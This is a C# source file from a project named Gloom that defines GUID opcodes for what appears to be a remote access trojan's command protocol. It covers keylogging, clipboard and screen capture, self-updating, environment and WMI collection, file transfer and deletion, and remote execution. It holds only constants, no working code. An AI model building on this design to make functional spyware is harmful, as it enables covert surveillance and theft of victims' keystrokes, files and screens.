namespace Gloom;

/// <summary>
/// Payload opcode definitions.
/// </summary>
public static class OpCodes
{
	//public readonly static Guid HelloWorld = Guid.Parse("6694af3e-f1c6-4f05-a1ad-7fa6f12d2117");
	//public readonly static Guid Test = Guid.Parse("09a3e64a-f87a-48d6-9760-fd2d61bd31e5");

	#region Handshake
	public readonly static Guid ClientHello = Guid.Parse("033f8e43-ddee-4536-936e-71f94c599033");
	public readonly static Guid ServerHello = Guid.Parse("77b710eb-6507-4034-9ac6-c17d50e46b26");
	#endregion

	#region Global
	public static readonly Guid FeatureStateRequest = Guid.Parse("fa745c86-b8fb-4824-8e74-c38198ce7722");
	public static readonly Guid FeatureStateResponse = Guid.Parse("8b21ea64-0f91-45d2-88e2-2dbbb87d7249");
	#endregion

	#region KeyLogger
	public static readonly Guid KeyLoggerSettingRequest = Guid.Parse("965370b2-72de-468e-bcd8-2e953b45e82a");
	public static readonly Guid KeyLogRequest = Guid.Parse("58024ec1-4e1c-4890-a583-665248236da0");
	public static readonly Guid KeyLogResponse = Guid.Parse("0c78654f-9119-4177-8c9d-ab10e44925f6");
	#endregion

	#region ClipboardLogger
	public readonly static Guid ClipboardLogRequest = Guid.Parse("f9ddb84b-84b1-4d3f-9a43-51e8b1d386f8");
	public readonly static Guid ClipboardLogResponse = Guid.Parse("d4b0571b-7f54-4b25-8b7a-ee9e5d690fe8");
	public static readonly Guid ClipboardLoggerSettingRequest = Guid.Parse("e21f3180-54ff-4d77-a326-fb16c0173c58");
	#endregion

	#region ScreenCapturer
	public static readonly Guid ScreenCaptureListRequest = Guid.Parse("069a18b0-97f5-4aa6-88b9-1e844dae327f");
	public static readonly Guid ScreenCaptureListResponse = Guid.Parse("18fb03f0-cd5b-4c8c-aac0-7ce1faf7ad20");
	public static readonly Guid CurrentScreenRequest = Guid.Parse("948f99d0-3b3f-4dd2-8417-fd712d32e6ef");
	public static readonly Guid CurrentScreenResponse = Guid.Parse("4304b8aa-87db-4b62-955d-b9922153c1e3");
	public static readonly Guid ScreenCapturerSettingRequest = Guid.Parse("c2de9bc3-ba12-4a89-a8d5-a882e9d41aa4");
	#endregion

	#region SelfUpdater
	public static readonly Guid UpdateClientRequest = Guid.Parse("6eb58aa5-8b95-4e7e-b0ed-a08bde2adaf9");
	public static readonly Guid UpdateClientResponse = Guid.Parse("935399d2-ad8b-4c43-9441-9d506ecfd4c7");
	#endregion

	#region InfoCollector
	public static readonly Guid EnvVarsRequest = Guid.Parse("07bbcff6-6c3f-4a9a-aefc-02349ef12c74");
	public static readonly Guid EnvVarsResponse = Guid.Parse("c6839ca1-c091-4a7d-9cfb-78ca0edf9900");
	public static readonly Guid WmiInfoRequest = Guid.Parse("afb7c7a2-5f43-4dcd-ae8e-a5ced16bcf81");
	public static readonly Guid WmiInfoResponse = Guid.Parse("9d86ce32-c100-412a-8b51-3898dd975e82");

	#endregion

	#region FileIO
	public static readonly Guid DownloadFileRequest = Guid.Parse("c5c091c2-3605-4747-a84d-511c17f5fb23");
	public static readonly Guid DownloadFileChunkResponse = Guid.Parse("397c3e2a-13fb-41ca-97c2-cdc1111e79d4");
	public static readonly Guid DownloadFileResponse = Guid.Parse("5ee96e53-0841-4c2e-bbbe-d14bb230a6f6");
	public static readonly Guid UploadFileRequest = Guid.Parse("f628bc06-a615-46d5-b43f-3b7e8e33b8da");
	public static readonly Guid UploadFileChunkRequest = Guid.Parse("3e8fa7f2-c195-48e8-980d-55dd3da1ae2a");
	public static readonly Guid UploadFileResponse = Guid.Parse("bc4bba65-284c-4f39-9897-26ecb0cf307d");
	public static readonly Guid DeleteFileRequest = Guid.Parse("9b886262-191d-4b77-815b-00fe5d3dc090");
	public static readonly Guid DeleteFileResponse = Guid.Parse("1d4df5ea-7077-49df-a723-6bdaaa3835ca");
	#endregion

	#region Remote File Execution
	public static readonly Guid RemoteExecutionRequest = Guid.Parse("82e542e7-501f-474a-937b-4068628cd6c2");
	public static readonly Guid RemoteExecutionResponse = Guid.Parse("22728337-cebd-4bde-8cd6-434d0b8fb813");
	#endregion
}
